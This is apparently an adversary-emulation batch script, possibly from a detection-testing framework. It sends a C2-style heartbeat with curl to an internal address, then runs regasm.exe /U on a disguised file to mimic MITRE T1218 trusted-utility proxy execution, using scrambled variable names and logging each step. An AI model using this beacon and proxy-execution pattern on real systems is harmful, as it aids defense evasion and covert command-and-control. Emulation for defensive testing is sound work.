@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET pjkcpgw=%APPDATA%\8231\baf3c0cb
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?8231-7
SET hlbnp=ITZEL-S2B
SET pudaazx=7
SET syjfr=illustrator.txt
SET ewjmdkff=8231

REM Use random names in script
SET logfile=%APPDATA%\!pudaazx!\macula-simulations.log

REM 1. C2 HEARTBEAT
echo [%DATE% %TIME%][DEBUG][!hlbnp!]: heartbeat_start=curl -k -s -o nul "!drguvr!">> "!logfile!" 2>nul
curl -k -s -o nul "!drguvr!"
echo [%DATE% %TIME%][DEBUG][!hlbnp!]: heartbeat_complete=>> "!logfile!" 2>nul

REM 2. T1218: Trusted Developer Utilities Proxy Execution
SET ttp_result=1
SET ttp_error=

REM Change directory
echo [%DATE% %TIME%][DEBUG][!hlbnp!]: chdir_start=!pjkcpgw!>> "!logfile!" 2>nul
cd /d "!pjkcpgw!" 2>nul
if !errorlevel! neq 0 (
    SET ttp_result=0
    SET ttp_error=directory_not_found
    echo [%DATE% %TIME%][DEBUG][!hlbnp!]: chdir_failed=!errorlevel!>> "!logfile!" 2>nul
) else (
    echo [%DATE% %TIME%][DEBUG][!hlbnp!]: chdir_complete=>> "!logfile!" 2>nul
)

REM Execute regasm.exe for DLL unregistration
if !ttp_result! equ 1 (
    echo [%DATE% %TIME%][DEBUG][!hlbnp!]: regasm_start=/U "!syjfr!">> "!logfile!" 2>nul
    "%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\regasm.exe" /U "!syjfr!" 2>nul
    if !errorlevel! neq 0 (
        SET ttp_result=0
        SET ttp_error=regasm_failed_!errorlevel!
    )
    echo [%DATE% %TIME%][DEBUG][!hlbnp!]: regasm_complete=result=!ttp_result! error=!ttp_error!>> "!logfile!" 2>nul
)

REM TTP logging with normalized timestamp
SET dt=!DATE!
SET tm=!TIME!
SET normdate=!dt:~6,4!-!dt:~3,2!-!dt:~0,2!
SET normtime=!tm:~0,2!:!tm:~3,2!:!tm:~6,2!.!tm:~9,3!

echo [!normdate! !normtime!][!hlbnp!]: !pudaazx!-!ewjmdkff!-T1218|Trusted Developer Utilities Proxy Execution=!ttp_result!:!ttp_error!>> "!logfile!" 2>nul